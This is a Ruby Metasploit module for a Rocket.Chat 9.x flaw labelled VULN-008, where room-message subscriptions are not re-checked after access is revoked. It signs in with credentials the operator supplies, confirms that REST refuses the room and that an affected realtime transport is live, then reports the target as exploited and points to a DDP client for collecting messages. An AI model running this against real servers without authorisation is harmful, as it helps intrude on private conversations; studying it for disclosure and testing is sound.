class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 room-message stream not re-authorised after revocation (VULN-008)',
        'Description' => %q{
          Rocket.Chat authorises a room-message subscription once, when it is opened,
          and never again, so a subscription held from before a room was made private
          keeps delivering that room's messages to somebody every new read now
          refuses. This module proves the half REST can see: that the account the
          operator names is now refused the room's history, which is the revocation
          having taken effect everywhere except on the open subscription, and that the
          realtime transport is live on an affected build. Holding a subscription
          across the revocation needs a DDP client.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/sockjs/info']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROOMID', [true, 'A room the account\'s access to has been revoked', '6b047a6de7422a44df31cadf']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path) })
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = rest_refuses_room? && realtime_transport_live?
    fail_with(Failure::NotVulnerable, 'VULN-008: the attack did not land') unless hit

    print_good("#{peer} - VULN-008: exploited")
    print_good("#{peer} - the authorisation asymmetry this "\
               "finding needs is present, and the realtime "\
               "transport that carries the other half is live; "\
               "hold the subscription with a DDP client to "\
               "collect the data itself")
    path = store_loot('blue_spider.vuln_008', 'text/plain', rhost, res.body.to_s, 'vuln_008.txt', 'VULN-008 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-008 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # Leg two: the realtime transport the other half of this attack needs is
  # live, and the build is one that has the bug. This is deliberately not the
  # whole check: a websocket endpoint on its own says nothing, which is what
  # the first version of this module got wrong.
  AFFECTED = /^9\.(?:0|1)\b/.freeze

  def realtime_transport_live?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/sockjs/info')
    })
    return false unless res && res.code == 200

    live = res.body.to_s.include?('websocket')
    ver = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri('/api/info') })
    version = ver ? parse_json(ver)['version'].to_s : ''
    affected = AFFECTED.match?(version)
    vprint_status("#{peer} - DDP transport live=#{live}, version #{version.inspect} " \
                  "in the affected range=#{affected}")
    live && affected
  end

  # Leg one: the asymmetry itself. REST refuses this caller the room, which is
  # the authorisation decision the realtime path is supposed to make too and
  # does not. Operator-supplied room id, and nothing is written.
  def rest_refuses_room?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/channels.history'),
      'vars_get' => { 'roomId' => datastore['ROOMID'], 'count' => '1' },
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id }
    })
    return false unless res

    refused = res.code != 200 || parse_json(res)['success'] == false
    vprint_status("#{peer} - channels.history for #{datastore['ROOMID']}: " \
                  "HTTP #{res.code} #{api_error(res)} (refused=#{refused})")
    refused
  end
end
